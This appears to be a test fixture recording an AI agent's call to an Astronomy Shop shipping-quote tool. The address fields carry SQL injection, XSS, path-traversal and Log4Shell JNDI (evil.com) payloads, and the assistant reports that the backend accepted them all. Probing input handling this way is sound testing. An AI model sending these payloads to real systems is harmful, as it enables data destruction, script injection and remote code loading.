@@ -1,0 +1,232 @@
+{
+  "request": {
+    "messages": [
+      {
+        "content": "You are a helpful assistant. Be concise and accurate.",
+        "role": "system"
+      },
+      {
+        "content": "Get a shipping quote for product 66VCHSJNUP with street address set to \"'; DROP TABLE addresses;--\", city \"<script>alert('xss')</script>\", state \"../../etc/passwd\", zip \"${jndi:ldap://evil.com/a}\", country \"USA\", currency USD. Report how the backend handles each malicious field.",
+        "role": "user"
+      },
+      {
+        "content": null,
+        "role": "assistant",
+        "tool_calls": [
+          {
+            "function": {
+              "arguments": "{\"items\": {\"productId\": \"66VCHSJNUP\", \"quantity\": 1}, \"currency_code\": \"USD\", \"address\": {\"streetAddress\": \"'; DROP TABLE addresses;--\", \"city\": \"<script>alert('xss')</script>\", \"state\": \"../../etc/passwd\", \"country\": \"USA\", \"zipCode\": \"${jndi:ldap://evil.com/a}\"}}",
+              "name": "get_shipping_quote"
+            },
+            "id": "call_e8eFZWkwMP8LX5KXE1DJyD1g",
+            "type": "function"
+          }
+        ]
+      },
+      {
+        "content": "{\"currencyCode\": \"USD\", \"units\": 8, \"nanos\": 990000000}",
+        "role": "tool",
+        "tool_call_id": "call_e8eFZWkwMP8LX5KXE1DJyD1g"
+      }
+    ],
+    "model": "azure/gpt-5.5",
+    "tools": [
+      {
+        "function": {
+          "description": "Add a product (product_id) to the shopping cart for a user (user_id).",
+          "name": "add_to_cart",
+          "parameters": {
+            "properties": {
+              "product_id": {
+                "type": "string"
+              },
+              "quantity": {
+                "default": 1,
+                "type": "integer"
+              },
+              "user_id": {
+                "type": "string"
+              }
+            },
+            "required": [
+              "user_id",
+              "product_id"
+            ],
+            "type": "object"
+          }
+        },
+        "type": "function"
+      },
+      {
+        "function": {
+          "description": "Checkout the user's cart and create an order.\nTakes request in the format {string user_id, string userCurrency, Address address, string email, CreditCardInfo creditCard}\nWhere Address is {string streetAddress, string city, string state, string country, string zipCode} and\nCreditCardInfo is {string creditCardNumber, int32 creditCardCvv, int32 creditCardExpirationYear, int32 creditCardExpirationMonth}",
+          "name": "checkout",
+          "parameters": {
+            "properties": {
+              "checkout_person": {}
+            },
+            "required": [
+              "checkout_person"
+            ],
+            "type": "object"
+          }
+        },
+        "type": "function"
+      },
+      {
+        "function": {
+          "description": "Empty the shopping cart for a user.",
+          "name": "empty_cart",
+          "parameters": {
+            "properties": {
+              "user_id": {
+                "type": "string"
+              }
+            },
+            "required": [
+              "user_id"
+            ],
+            "type": "object"
+          }
+        },
+        "type": "function"
+      },
+      {
+        "function": {
+          "description": "Fetch promotional ads for Astronomy Shop homepage.\nEg : category: `telescopes` or `travel`",
+          "name": "get_ads",
+          "parameters": {
+            "properties": {
+              "category": {
+                "type": "string"
+              }
+            },
+            "required": [
+              "category"
+            ],
+            "type": "object"
+          }
+        },
+        "type": "function"
+      },
+      {
+        "function": {
+          "description": "Retrieve the current contents of a user's cart.",
+          "name": "get_cart",
+          "parameters": {
+            "properties": {
+              "user_id": {
+                "type": "string"
+              }
+            },
+            "required": [
+              "user_id"
+            ],
+            "type": "object"
+          }
+        },
+        "type": "function"
+      },
+      {
+        "function": {
+          "description": "Get detailed information about a product using its ID.",
+          "name": "get_product",
+          "parameters": {
+            "properties": {
+              "product_id": {
+                "type": "string"
+              }
+            },
+            "required": [
+              "product_id"
+            ],
+            "type": "object"
+          }
+        },
+        "type": "function"
+      },
+      {
+        "function": {
+          "description": "Get product recommendations for a user.",
+          "name": "get_recommendations",
+          "parameters": {
+            "properties": {
+              "product_id": {
+                "type": "string"
+              }
+            },
+            "required": [
+              "product_id"
+            ],
+            "type": "object"
+          }
+        },
+        "type": "function"
+      },
+      {
+        "function": {
+          "description": "Get estimated shipping cost for a given address.\n`items`: list of {productId, quantity} (a single dict is also accepted).\n`currency_code`: ISO 4217 code, e.g. \"USD\".\n`address`: {streetAddress, city, state, country, zipCode}.",
+          "name": "get_shipping_quote",
+          "parameters": {
+            "properties": {
+              "address": {},
+              "currency_code": {},
+              "items": {}
+            },
+            "required": [
+              "items",
+              "currency_code",
+              "address"
+            ],
+            "type": "object"
+          }
+        },
+        "type": "function"
+      },
+      {
+        "function": {
+          "description": "List supported currencies in Astronomy Shop.",
+          "name": "get_supported_currencies",
+          "parameters": {
+            "properties": {},
+            "type": "object"
+          }
+        },
+        "type": "function"
+      },
+      {
+        "function": {
+          "description": "List all products available in the Astronomy Shop.",
+          "name": "list_products",
+          "parameters": {
+            "properties": {},
+            "type": "object"
+          }
+        },
+        "type": "function"
+      }
+    ]
+  },
+  "response": {
+    "choices": [
+      {
+        "finish_reason": "stop",
+        "index": 0,
+        "logprobs": null,
+        "message": {
+          "audio": null,
+          "content": "Shipping quote for product `66VCHSJNUP`:\n\n- **Cost:** `USD 8.99`\n\nBackend handling of the supplied fields based on the response:\n\n- **streetAddress:** `'; DROP TABLE addresses;--`  \n  - Accepted as input; no error was returned.\n- **city:** `<script>alert('xss')</script>`  \n  - Accepted as input; no error was returned.\n- **state:** `../../etc/passwd`  \n  - Accepted as input; no error was returned.\n- **zipCode:** `${jndi:ldap://evil.com/a}`  \n  - Accepted as input; no error was returned.\n- **country:** `USA`  \n  - Accepted as input; no error was returned.\n- **currency:** `USD`  \n  - Accepted and used for the quote.\n\nThe backend returned a normal shipping quote and did not surface any validation or sanitization error for the malicious-looking address fields.",
+          "function_call": null,
+          "refusal": null,
+          "role": "assistant",
+          "tool_calls": null
+        }
+      }
+    ],
+    "created": 0,
+    "id": "chatcmpl-fixture",
+    "model": "azure/gpt-5.5",
+    "moderation": null,
+    "object": "chat.completion"
+  }
+}
